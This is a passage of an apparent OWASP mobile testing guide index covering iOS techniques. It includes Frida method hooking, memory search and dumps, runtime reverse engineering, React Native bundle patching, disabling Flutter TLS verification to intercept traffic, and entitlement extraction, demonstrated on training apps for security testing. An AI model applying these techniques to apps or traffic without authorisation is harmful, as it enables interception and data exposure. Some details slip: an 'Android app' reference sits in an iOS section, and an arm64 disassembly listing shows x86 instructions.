/Users/MAS/signed.ipa\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0092/#using-sideloadly","title":"Using Sideloadly","text":"<p>Sideloadly can take care of obtaining a valid certificate for your app, but it is not possible to simply sign an existing IPA file in-place. Sideloadly will sign the given IPA file and directly install it on the connected device. When using a normal Apple account, Sideloadly will modify the original package name by appending your team identifier (e.g. <code>sg.vp.UnCrackable1</code> becomes <code>sg.vp.UnCrackable1.QH868V5764</code>)</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0094/","title":"MASTG-TECH-0094: Getting Loaded Classes and Methods dynamically","text":"<p>In the Frida REPL Objective-C runtime the <code>ObjC</code> command can be used to access information within the running app. Within the <code>ObjC</code> command the function <code>enumerateLoadedClasses</code> lists the loaded classes for a given application.</p> <pre><code>$ frida -U -f com.iOweApp\n\n[iPhone::com.iOweApp]-&gt; ObjC.enumerateLoadedClasses()\n{\n    \"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\": [\n        \"__NSBlockVariable__\",\n        \"__NSGlobalBlock__\",\n        \"__NSFinalizingBlock__\",\n        \"__NSAutoBlock__\",\n        \"__NSMallocBlock__\",\n        \"__NSStackBlock__\"\n    ],\n    \"/private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp\": [\n        \"JailbreakDetection\",\n        \"CriticalLogic\",\n        \"ViewController\",\n        \"AppDelegate\"\n    ]\n}\n</code></pre> <p>Using <code>ObjC.classes.&lt;classname&gt;.$ownMethods</code> the methods declared in each class can be listed.</p> <pre><code>[iPhone::com.iOweApp]-&gt; ObjC.classes.JailbreakDetection.$ownMethods\n[\n    \"+ isJailbroken\"\n]\n\n[iPhone::com.iOweApp]-&gt; ObjC.classes.CriticalLogic.$ownMethods\n[\n    \"+ doSha256:\",\n    \"- a:\",\n    \"- AES128Operation:data:key:iv:\",\n    \"- coreLogic\",\n    \"- bat\",\n    \"- b:\",\n    \"- hexString:\"\n]\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0095/","title":"MASTG-TECH-0095: Method Hooking","text":"","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0095/#frida","title":"Frida","text":"<p>In  Execution Tracing we've used frida-trace when navigating to a website in Safari and found that the <code>initWithURL:</code> method is called to initialize a new URL request object. We can look up the declaration of this method on the Apple Developer Website:</p> <pre><code>- (instancetype)initWithURL:(NSURL *)url;\n</code></pre> <p>Using this information we can write a Frida script that intercepts the <code>initWithURL:</code> method and prints the URL passed to the method. The full script is below. Make sure you read the code and inline comments to understand what's going on.</p> <pre><code>import sys\nimport frida\n\n\n# JavaScript to be injected\nfrida_code = \"\"\"\n\n    // Obtain a reference to the initWithURL: method of the NSURLRequest class\n    var URL = ObjC.classes.NSURLRequest[\"- initWithURL:\"];\n\n    // Intercept the method\n    Interceptor.attach(URL.implementation, {\n        onEnter: function(args) {\n            // Get a handle on NSString\n            var NSString = ObjC.classes.NSString;\n\n            // Obtain a reference to the NSLog function, and use it to print the URL value\n            // args[2] refers to the first method argument (NSURL *url)\n            var NSLog = new NativeFunction(Module.findExportByName('Foundation', 'NSLog'), 'void', ['pointer', '...']);\n\n            // We should always initialize an autorelease pool before interacting with Objective-C APIs\n            var pool = ObjC.classes.NSAutoreleasePool.alloc().init();\n\n            try {\n                // Creates a JS binding given a NativePointer.\n                var myNSURL = new ObjC.Object(args[2]);\n\n                // Create an immutable ObjC string object from a JS string object.\n                var str_url = NSString.stringWithString_(myNSURL.toString());\n\n                // Call the iOS NSLog function to print the URL to the iOS device logs\n                NSLog(str_url);\n\n                // Use Frida's console.log to print the URL to your terminal\n                console.log(str_url);\n\n            } finally {\n                pool.release();\n            }\n        }\n    });\n\"\"\"\n\nprocess = frida.get_usb_device().attach(\"Safari\")\nscript = process.create_script(frida_code)\nscript.load()\n\nsys.stdin.read()\n</code></pre> <p>Start Safari on the iOS device. Run the above Python script on your connected host and open the device log (as explained in the section \"Monitoring System Logs\" from the chapter \"iOS Basic Security Testing\"). Try opening a new URL in Safari, e.g. https://github.com/OWASP/mastg; you should see Frida's output in the logs as well as in your terminal.</p> <p></p> <p>Of course, this example illustrates only one of the things you can do with Frida. To unlock the tool's full potential, you should learn to use its JavaScript API. The documentation section of the Frida website has a tutorial and examples for using Frida on iOS.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0096/","title":"MASTG-TECH-0096: Process Exploration","text":"<p>When testing an app, process exploration can provide the tester with deep insights into the app process memory. It can be achieved via runtime instrumentation and allows to perform tasks such as:</p> <ul> <li>Retrieving the memory map and loaded libraries.</li> <li>Searching for occurrences of certain data.</li> <li>After doing a search, obtaining the location of a certain offset in the memory map.</li> <li>Performing a memory dump and inspect or reverse engineer the binary data offline.</li> <li>Reverse engineering a binary or Framework while it's running.</li> </ul> <p>As you can see, these tasks are rather supportive and/or passive, they'll help us collect data and information that will support other techniques. Therefore, they're normally used in combination with other techniques such as method hooking.</p> <p>In the following sections you will be using  r2frida to retrieve information straight from the app runtime. First start by opening an r2frida session to the target app (e.g.  iGoat-Swift) that should be running on your iPhone (connected per USB). Use the following command:</p> <pre><code>r2 frida://usb//iGoat-Swift\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0096/#memory-maps-and-inspection","title":"Memory Maps and Inspection","text":"<p>You can retrieve the app's memory maps by running <code>:dm</code>:</p> <pre><code>[0x00000000]&gt; :dm\n0x0000000100b7c000 - 0x0000000100de0000 r-x /private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/iGoat-Swift\n0x0000000100de0000 - 0x0000000100e68000 rw- /private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/iGoat-Swift\n0x0000000100e68000 - 0x0000000100e97000 r-- /private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/iGoat-Swift\n...\n0x0000000100ea8000 - 0x0000000100eb0000 rw-\n0x0000000100eb0000 - 0x0000000100eb4000 r--\n0x0000000100eb4000 - 0x0000000100eb8000 r-x /usr/lib/TweakInject.dylib\n0x0000000100eb8000 - 0x0000000100ebc000 rw- /usr/lib/TweakInject.dylib\n0x0000000100ebc000 - 0x0000000100ec0000 r-- /usr/lib/TweakInject.dylib\n0x0000000100f60000 - 0x00000001012dc000 r-x /private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/Frameworks/Realm.framework/Realm\n</code></pre> <p>While you're searching or exploring the app memory, you can always verify where your current offset is located in the memory map. Instead of noting and searching for the memory address in this list you can simply run <code>:dm.</code>. You'll find an example in the following section \"In-Memory Search\".</p> <p>If you're only interested into the modules (binaries and libraries) that the app has loaded, you can use the command <code>:il</code> to list them all:</p> <pre><code>[0x00000000]&gt; :il\n0x0000000100b7c000 iGoat-Swift\n0x0000000100eb4000 TweakInject.dylib\n0x00000001862c0000 SystemConfiguration\n0x00000001847c0000 libc++.1.dylib\n0x0000000185ed9000 Foundation\n0x000000018483c000 libobjc.A.dylib\n0x00000001847be000 libSystem.B.dylib\n0x0000000185b77000 CFNetwork\n0x0000000187d64000 CoreData\n0x00000001854b4000 CoreFoundation\n0x00000001861d3000 Security\n0x000000018ea1d000 UIKit\n0x0000000100f60000 Realm\n</code></pre> <p>As you might expect you can correlate the addresses of the libraries with the memory maps: e.g. the main app from  iGoat-Swift is called \"iGoat-Swift\" and is located at <code>0x0000000100b7c000</code> and the Realm Framework at <code>0x0000000100f60000</code>.</p> <p>You can also use  objection for iOS to display the same information.</p> <pre><code>$ objection --gadget OWASP.iGoat-Swift explore\n\nOWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # memory list modules\nSave the output by adding `--json modules.json` to this command\n\nName                              Base         Size                  Path\n--------------------------------  -----------  --------------------  ------------------------------------------------------------------------------\niGoat-Swift                       0x100b7c000  2506752 (2.4 MiB)     /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGo...\nTweakInject.dylib                 0x100eb4000  16384 (16.0 KiB)      /usr/lib/TweakInject.dylib\nSystemConfiguration               0x1862c0000  446464 (436.0 KiB)    /System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguratio...\nlibc++.1.dylib                    0x1847c0000  368640 (360.0 KiB)    /usr/lib/libc++.1.dylib\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0096/#in-memory-search","title":"In-Memory Search","text":"<p>In-memory search is a very useful technique to test for sensitive data that might be present in the app memory.</p> <p>See r2frida's help on the search command (<code>:/?</code>) to learn about the search command and get a list of options. The following shows only a subset of them:</p> <pre><code>[0x00000000]&gt; :/?\n /      search\n /j     search json\n /w     search wide\n /wj    search wide json\n /x     search hex\n /xj    search hex json\n...\n</code></pre> <p>You can adjust your search by using the search settings <code>:e~search</code>. For example, <code>:e search.quiet=true;</code> will print only the results and hide search progress:</p> <pre><code>[0x00000000]&gt; :e~search\ne search.in=perm:r--\ne search.quiet=false\n</code></pre> <p>For now, we'll continue with the defaults and concentrate on string search. In this first example, you can start by searching for something that you know should be located in the main binary of the app (for example, the name of the  iGoat-Swift app):</p> <pre><code>[0x00000000]&gt; :/ iGoat\nSearching 5 bytes: 69 47 6f 61 74\nSearching 5 bytes in [0x0000000100b7c000-0x0000000100de0000]\n...\nhits: 509\n0x100d7d332 hit2_0 iGoat_Swift24StringAnalysisExerciseVCC\n0x100d7d3b2 hit2_1 iGoat_Swift28BrokenCryptographyExerciseVCC\n0x100d7d442 hit2_2 iGoat_Swift23BackgroundingExerciseVCC\n0x100d7d4b2 hit2_3 iGoat_Swift9AboutCellC\n0x100d7d522 hit2_4 iGoat_Swift12FadeAnimatorV\n</code></pre> <p>Now take the first hit, seek to it and check your current location in the memory map:</p> <pre><code>[0x00000000]&gt; s 0x100d7d332\n[0x100d7d332]&gt; :dm.\n0x0000000100b7c000 - 0x0000000100de0000 r-x /private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/iGoat-Swift\n</code></pre> <p>As expected, you are located in the region of the main iGoat-Swift binary (r-x, read and execute). In the previous section, you saw that the main binary is located between <code>0x0000000100b7c000</code> and <code>0x0000000100e97000</code>.</p> <p>Now, for this second example, you can search for something that's not in the app binary nor in any loaded library, typically user input. Open the  iGoat-Swift app and navigate in the menu to Authentication -&gt; Remote Authentication -&gt; Start. There you'll find a password field that you can overwrite. Write the string \"owasp-mstg\" but do not click on Login just yet. Perform the following two steps.</p> <pre><code>[0x00000000]&gt; :/ owasp-mstg\nhits: 1\n0x1c06619c0 hit3_0 owasp-mstg\n</code></pre> <p>In fact, the string could be found at address <code>0x1c06619c0</code>. Seek <code>s</code> to there and retrieve the current memory region with <code>:dm.</code>.</p> <pre><code>[0x100d7d332]&gt; s 0x1c06619c0\n[0x1c06619c0]&gt; :dm.\n0x00000001c0000000 - 0x00000001c8000000 rw-\n</code></pre> <p>Now you know that the string is located in a rw- (read and write) region of the memory map.</p> <p>Additionally, you can search for occurrences of the wide version of the string (<code>/w</code>) and, again, check their memory regions:</p> <p>This time we run the <code>:dm.</code> command for all <code>@@</code> hits matching the glob <code>hit5_*</code>.</p> <pre><code>[0x00000000]&gt; /w owasp-mstg\nSearching 20 bytes: 6f 00 77 00 61 00 73 00 70 00 2d 00 6d 00 73 00 74 00 67 00\nSearching 20 bytes in [0x0000000100708000-0x000000010096c000]\n...\nhits: 2\n0x1020d1280 hit5_0 6f0077006100730070002d006d00730074006700\n0x1030c9c85 hit5_1 6f0077006100730070002d006d00730074006700\n\n[0x00000000]&gt; :dm.@@ hit5_*\n0x0000000102000000 - 0x0000000102100000 rw-\n0x0000000103084000 - 0x00000001030cc000 rw-\n</code></pre> <p>They are in a different rw- region. Note that searching for the wide versions of strings is sometimes the only way to find them as you'll see in the following section.</p> <p>In-memory search can be very useful to quickly know if certain data is located in the main app binary, inside a shared library or in another region. You may also use it to test the behavior of the app regarding how the data is kept in memory. For instance, you could continue the previous example, this time clicking on Login and searching again for occurrences of the data. Also, you may check if you still can find those strings in memory after the login is completed to verify if this sensitive data is wiped from memory after its use.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0096/#memory-dump","title":"Memory Dump","text":"<p>You can dump the app's process memory with  objection for iOS and  Fridump. To take advantage of these tools on a non-jailbroken device, the Android app must be repackaged with <code>frida-gadget.so</code> and re-signed. A detailed explanation of this process is described in  Injecting Frida Gadget into an IPA Automatically. To use these tools on a jailbroken phone, simply have frida-server installed and running.</p> <p>With objection it is possible to dump all memory of the running process on the device by using the command <code>memory dump all</code>.</p> <pre><code>$ objection explore\n\niPhone on (iPhone: 10.3.1) [usb] # memory dump all /Users/foo/memory_iOS/memory\nDumping 768.0 KiB from base: 0x1ad200000  [####################################]  100%\nMemory dumped to file: /Users/foo/memory_iOS/memory\n</code></pre> <p>Alternatively you can use Fridump. First, you need the name of the app you want to dump, which you can get with <code>frida-ps</code>.</p> <pre><code>$ frida-ps -U\n PID  Name\n----  ------\n1026  Gadget\n</code></pre> <p>Afterwards, specify the app name in Fridump.</p> <pre><code>$ python3 fridump.py -u Gadget -s\n\nCurrent Directory: /Users/foo/PentestTools/iOS/fridump\nOutput directory is set to: /Users/foo/PentestTools/iOS/fridump/dump\nCreating directory...\nStarting Memory dump...\nProgress: [##################################################] 100.0% Complete\n\nRunning strings on all files:\nProgress: [##################################################] 100.0% Complete\n\nFinished! Press Ctrl+C\n</code></pre> <p>When you add the <code>-s</code> flag, all strings are extracted from the dumped raw memory files and added to the file <code>strings.txt</code>, which is stored in Fridump's dump directory.</p> <p>In both cases, if you open the file in radare2 you can use its search command (<code>/</code>). Note that first we do a standard string search which doesn't succeed and next we search for a wide string, which successfully finds our string \"owasp-mstg\".</p> <pre><code>$ r2 memory_ios\n[0x00000000]&gt; / owasp-mstg\nSearching 10 bytes in [0x0-0x628c000]\nhits: 0\n[0x00000000]&gt; /w owasp-mstg\nSearching 20 bytes in [0x0-0x628c000]\nhits: 1\n0x0036f800 hit4_0 6f0077006100730070002d006d00730074006700\n</code></pre> <p>Next, we can seek to its address using <code>s 0x0036f800</code>  or <code>s hit4_0</code> and print it using <code>psw</code> (which stands for print string wide) or use <code>px</code> to print its raw hexadecimal values:</p> <pre><code>[0x0036f800]&gt; psw\nowasp-mstg\n\n[0x0036f800]&gt; px 48\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0x0036f800  6f00 7700 6100 7300 7000 2d00 6d00 7300  o.w.a.s.p.-.m.s.\n0x0036f810  7400 6700 0000 0000 0000 0000 0000 0000  t.g.............\n0x0036f820  0000 0000 0000 0000 0000 0000 0000 0000  ................\n</code></pre> <p>Note that in order to find this string using the <code>strings</code> command you'll have to specify an encoding using the <code>-e</code> flag and in this case <code>l</code> for 16-bit little-endian character.</p> <pre><code>$ strings -e l memory_ios | grep owasp-mstg\nowasp-mstg\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0097/","title":"MASTG-TECH-0097: Runtime Reverse Engineering","text":"<p>Runtime reverse engineering can be seen as the on-the-fly version of reverse engineering where you don't have the binary data to your host computer. Instead, you'll analyze it straight from the memory of the app.</p> <p>We'll keep using the  iGoat-Swift app, open a session with  r2frida <code>r2 frida://usb//iGoat-Swift</code> and you can start by displaying the target binary information by using the <code>:i</code> command:</p> <pre><code>[0x00000000]&gt; :i\narch                arm\nbits                64\nos                  darwin\npid                 2166\nuid                 501\nobjc                true\nruntime             V8\njava                false\ncylang              true\npageSize            16384\npointerSize         8\ncodeSigningPolicy   optional\nisDebuggerAttached  false\ncwd                 /\n</code></pre> <p>Search all symbols of a certain module with <code>:is &lt;lib&gt;</code>, e.g. <code>:is libboringssl.dylib</code>.</p> <p>The following does a case-insensitive search (grep) for symbols including \"aes\" (<code>~+aes</code>).</p> <pre><code>[0x00000000]&gt; :is libboringssl.dylib~+aes\n0x1863d6ed8 s EVP_aes_128_cbc\n0x1863d6ee4 s EVP_aes_192_cbc\n0x1863d6ef0 s EVP_aes_256_cbc\n0x1863d6f14 s EVP_has_aes_hardware\n0x1863d6f1c s aes_init_key\n0x1863d728c s aes_cipher\n0x0 u ccaes_cbc_decrypt_mode\n0x0 u ccaes_cbc_encrypt_mode\n...\n</code></pre> <p>Or you might prefer to look into the imports/exports. For example:</p> <ul> <li>List all imports of the main binary: <code>:ii iGoat-Swift</code>.</li> <li>List exports of the libc++.1.dylib library: <code>:iE /usr/lib/libc++.1.dylib</code>.</li> </ul> <p>For big binaries it's recommended to pipe the output to the internal less program by appending <code>~..</code>, i.e. <code>:ii iGoat-Swift~..</code> (if not, for this binary, you'd get almost 5000 lines printed to your terminal).</p> <p>The next thing you might want to look at are the classes:</p> <pre><code>[0x00000000]&gt; :ic~+passcode\nPSPasscodeField\n_UITextFieldPasscodeCutoutBackground\nUIPasscodeField\nPasscodeFieldCell\n...\n</code></pre> <p>List class fields:</p> <pre><code>[0x19687256c]&gt; :ic UIPasscodeField\n0x000000018eec6680 - becomeFirstResponder\n0x000000018eec5d78 - appendString:\n0x000000018eec6650 - canBecomeFirstResponder\n0x000000018eec6700 - isFirstResponder\n0x000000018eec6a60 - hitTest:forEvent:\n0x000000018eec5384 - setKeyboardType:\n0x000000018eec5c8c - setStringValue:\n0x000000018eec5c64 - stringValue\n...\n</code></pre> <p>Imagine that you are interested into <code>0x000000018eec5c8c - setStringValue:</code>. You can seek to that address with <code>s 0x000000018eec5c8c</code>, analyze that function <code>af</code> and print 10 lines of its disassembly <code>pd 10</code>:</p> <pre><code>[0x18eec5c8c]&gt; pd 10\n\u256d (fcn) fcn.18eec5c8c 35\n\u2502   fcn.18eec5c8c (int32_t arg1, int32_t arg3);\n\u2502 bp: 0 (vars 0, args 0)\n\u2502 sp: 0 (vars 0, args 0)\n\u2502 rg: 2 (vars 0, args 2)\n\u2502           0x18eec5c8c      f657bd         not byte [rdi - 0x43]      ; arg1\n\u2502           0x18eec5c8f      a9f44f01a9     test eax, 0xa9014ff4\n\u2502           0x18eec5c94      fd             std\n\u2502       \u256d\u2500&lt; 0x18eec5c95      7b02           jnp 0x18eec5c99\n\u2502       \u2502   0x18eec5c97      a9fd830091     test eax, 0x910083fd\n\u2502           0x18eec5c9c      f30300         add eax, dword [rax]\n\u2502           0x18eec5c9f      aa             stosb byte [rdi], al\n\u2502       \u256d\u2500&lt; 0x18eec5ca0      e003           loopne 0x18eec5ca5\n\u2502       \u2502   0x18eec5ca2      02aa9b494197   add ch, byte [rdx - 0x68beb665] ; arg3\n\u2570           0x18eec5ca8      f4             hlt\n</code></pre> <p>Finally, instead of doing a full memory search for strings, you may want to retrieve the strings from a certain binary and filter them, as you'd do offline with radare2. For this you have to find the binary, seek to it and then run the <code>:iz</code> command.</p> <p>It's recommended to apply a filter with a keyword <code>~&lt;keyword&gt;</code>/<code>~+&lt;keyword&gt;</code> to minimize the terminal output. If just want to explore all results you can also pipe them to the internal less <code>:iz~..</code>.</p> <pre><code>[0x00000000]&gt; :il~iGoa\n0x00000001006b8000 iGoat-Swift\n[0x00000000]&gt; s 0x00000001006b8000\n[0x1006b8000]&gt; :iz\nReading 2.390625MB ...\nDo you want to print 8568 lines? (y/N) N\n[0x1006b8000]&gt; :iz~+hill\nReading 2.390625MB ...\n[0x1006b8000]&gt; :iz~+pass\nReading 2.390625MB ...\n0x00000001006b93ed  \"passwordTextField\"\n0x00000001006bb11a  \"11iGoat_Swift20KeychainPasswordItemV0C5ErrorO\"\n0x00000001006bb164  \"unexpectedPasswordData\"\n0x00000001006d3f62  \"Error reading password from keychain - \"\n0x00000001006d40f2  \"Incorrect Password\"\n0x00000001006d4112  \"Enter the correct password\"\n0x00000001006d4632  \"T@\"UITextField\",N,W,VpasswordField\"\n0x00000001006d46f2  \"CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT);\"\n0x00000001006d4792  \"INSERT INTO creds(username, password) VALUES(?, ?)\"\n</code></pre> <p>To learn more, please refer to the r2frida wiki.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0098/","title":"MASTG-TECH-0098: Patching React Native Apps","text":"<p>If the React Native framework has been used for development, the main application code is in the file <code>Payload/[APP].app/main.jsbundle</code>. This file contains the JavaScript code. Most of the time, the JavaScript code in this file is minified. With the tool JStillery, a human-readable version of the file can be retried, which will allow code analysis. The CLI version of JStillery and the local server are preferable to the online version because the latter discloses the source code to a third party.</p> <p>At installation time, the application archive is unpacked into the folder <code>/private/var/containers/Bundle/Application/[GUID]/[APP].app</code> from iOS 10 onward, so the main JavaScript application file can be modified at this location.</p> <p>To identify the exact location of the application folder, you can use  ipainstaller:</p> <ol> <li>Use the command <code>ipainstaller -l</code> to list the applications installed on the device. Get the name of the target application from the output list.</li> <li>Use the command <code>ipainstaller -i [APP_NAME]</code> to display information about the target application, including the installation and data folder locations.</li> <li>Take the path referenced at the line that starts with <code>Application:</code>.</li> </ol> <p>Use the following approach to patch the JavaScript file:</p> <ol> <li>Navigate to the application folder.</li> <li>Copy the contents of the file <code>Payload/[APP].app/main.jsbundle</code> to a temporary file.</li> <li>Use <code>JStillery</code> to beautify and de-obfuscate the contents of the temporary file.</li> <li>Identify the code in the temporary file that should be patched and patch it.</li> <li>Put the patched code on a single line and copy it into the original <code>Payload/[APP].app/main.jsbundle</code> file.</li> <li>Close and restart the application.</li> </ol>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0110/","title":"MASTG-TECH-0110: Intercepting Flutter HTTPS Traffic","text":"<p>Flutter is an open-source UI software development kit (SDK) created by Google. It is used for building natively compiled applications for mobile, web, and desktop from a single codebase. Flutter uses Dart, which is not proxy-aware and uses its own certificate store. The application doesn't use the proxy configuration of the system and sends the data directly to the server. Connections are verified against built-in certificates, so any certificates installed on the system are simply ignored. Due to this, it is not possible to intercept HTTPS requests as the certificate of the proxy will never be trusted.</p> <p>In order to intercept Flutter HTTPS traffic, we need to deal with two problems:</p> <ul> <li>Make sure the traffic is sent to the proxy.</li> <li>Disable the TLS verification of any HTTPS connection.</li> </ul> <p>There are generally two approaches to this:  reFlutter and  Frida for iOS.</p> <ul> <li>reFlutter: This tool creates a modified version of the Flutter module which is then repackaged into the IPA. It configures the internal libraries to use a specified proxy and disable the TLS verification.</li> <li>Frida: The disable-flutter-tls.js script can dynamically remove the TLS verification without the need for repackaging. As it doesn't modify the proxy configuration, additional steps are needed (e.g. VPN, DNS, iptables, WIFI hotspot).</li> </ul>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0110/#intercepting-traffic-using-reflutter","title":"Intercepting Traffic using reFlutter","text":"<ol> <li> <p>Patch the app to enable traffic interception.</p> <p>Run the command to patch the app and select the option Traffic monitoring and interception and then enter the IP of the machine on which the interception proxy is running.</p> <pre><code>$ reflutter demo.ipa\n\nChoose an option:\n\n    Traffic monitoring and interception\n    Display absolute code offset for functions\n\n[1/2]? 1\n\nExample: (192.168.1.154) etc.\nPlease enter your BurpSuite IP: 192.168.29.216\n</code></pre> <p>This will create a release.RE.ipa file in the output folder.</p> </li> <li> <p>Sign ( Signing IPA files) the patched release.RE.ipa with the Apple certificates. This will create a signed \".ipa\" file in the output folder.</p> </li> <li> <p>Install the signed patched app on the mobile device.</p> </li> <li> <p>Configure the interception proxy. For example, in Burp:</p> </li> <li> <p>Under Proxy -&gt; Proxy settings -&gt; Add new Proxy setting.</p> </li> <li>Bind listening Port to <code>8083</code>.</li> <li>Select <code>Bind to address</code> to <code>All interfaces</code>.</li> <li> <p>Request Handling -&gt; support for invisible proxying.</p> </li> <li> <p>Open the app and start intercepting traffic.</p> </li> </ol>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0110/#intercepting-traffic-using-wifi-hotspot-openvpn-with-frida","title":"Intercepting Traffic using WIFI Hotspot / openVPN with Frida","text":"<ol> <li> <p>Configure using WIFI hotspot / openVPN method to redirect requests to Burp.</p> </li> <li> <p>Install the  iOS UnCrackable L1 on the mobile device.</p> </li> <li> <p>Configure the interception proxy. For example, in Burp:</p> </li> <li> <p>Under Proxy -&gt; Proxy settings -&gt; Add new Proxy setting.</p> </li> <li>Bind listening Port to <code>8080</code>.</li> <li>Select <code>Bind to address</code> to <code>All interfaces</code>.</li> <li> <p>Request Handling -&gt; support for invisible proxying.</p> </li> <li> <p>Run the  disable-flutter-tls-verification Frida script.</p> <pre><code>frida -U -f eu.nviso.flutterPinning -l disable-flutter-tls.js\n</code></pre> </li> <li> <p>Start intercepting traffic.</p> </li> </ol>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0111/","title":"MASTG-TECH-0111: Extracting Entitlements from MachO Binaries","text":"<p>Several tools can be used to extract entitlements from MachO binaries on iOS. This is useful for security assessments, as entitlements can reveal permissions and capabilities granted to an app.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0111/#using-rabin2","title":"Using  rabin2","text":"<p>Use rabin2 to extract entitlements from MachO binaries using <code>rabin2 -OC &lt;binary&gt;</code>:</p> <pre><code>rabin2 -OC MASTestApp\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n        &lt;key&gt;application-identifier&lt;/key&gt;\n        &lt;string&gt;AYRP7NNB54.org.owasp.mastestapp.MASTestApp-iOS&lt;/string&gt;\n        &lt;key&gt;com.apple.developer.team-identifier&lt;/key&gt;\n        &lt;string&gt;AYRP7NNB54&lt;/string&gt;\n        &lt;key&gt;get-task-allow&lt;/key&gt;\n        &lt;true/&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0111/#using-ldid","title":"Using  ldid","text":"<p>Use ldid to extract entitlements from MachO binaries. The <code>-e</code> flag is used to specify that entitlements should be extracted, and the <code>-A</code> flag is added to specify the desired architecture (<code>16777228:0</code>, which is <code>CPU_TYPE_ARM64:CPU_SUBTYPE_ARM64_ALL</code>):</p> <pre><code>ldid -e -A16777228:0 iGoat-Swift.app/iGoat-Swift\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n    &lt;key&gt;application-identifier&lt;/key&gt;\n    &lt;string&gt;TNAJ496RHB.OWASP.iGoat-Swift&lt;/string&gt;\n    &lt;key&gt;com.apple.developer.team-identifier&lt;/key&gt;\n    &lt;string&gt;TNAJ496RHB&lt;/string&gt;\n    &lt;key&gt;get-task-allow&lt;/key&gt;\n    &lt;true/&gt;\n    &lt;key&gt;keychain-access-groups&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;TNAJ496RHB.OWASP.iGoat-Swift&lt;/string&gt;\n    &lt;/array&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0111/#using-ipsw","title":"Using  ipsw","text":"<p>Use ipsw to extract entitlements from MachO binaries using the <code>ipsw macho info -e</code> command:</p> <pre><code>ipsw macho info -e iGoat-Swift.app/iGoat-Swift\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n    &lt;key&gt;application-identifier&lt;/key&gt;\n    &lt;string&gt;TNAJ496RHB.OWASP.iGoat-Swift&lt;/string&gt;\n    &lt;key&gt;com.apple.developer.team-identifier&lt;/key&gt;\n    &lt;string&gt;TNAJ496RHB&lt;/string&gt;\n    &lt;key&gt;get-task-allow&lt;/key&gt;\n    &lt;true/&gt;\n    &lt;key&gt;keychain-access-groups&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;TNAJ496RHB.OWASP.iGoat-Swift&lt;/string&gt;\n    &lt;/array&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0111/#using-codesign","title":"Using  codesign","text":"<p>Use <code>codesign</code> to extract entitlements from a MachO binary using <code>codesign -d --entitlements - &lt;binary&gt;</code>. Make sure to include the <code>-</code> as the argument for the <code>--entitlements</code> flag:</p> <pre><code>codesign -d --entitlements - iGoat-Swift.app/iGoat-Swift\n</code></pre> <pre><code>Executable=/Users/owasp/iGoat/Payload/iGoat-Swift.app/iGoat-Swift\n[Dict]\n    [Key] application-identifier\n    [Value]\n        [String] TNAJ496RHB.OWASP.iGoat-Swift\n    [Key] com.apple.developer.team-identifier\n    [Value]\n        [String] TNAJ496RHB\n    [Key] get-task-allow\n    [Value]\n        [Bool] true\n    [Key] keychain-access-groups\n    [Value]\n        [Array]\n            [String] 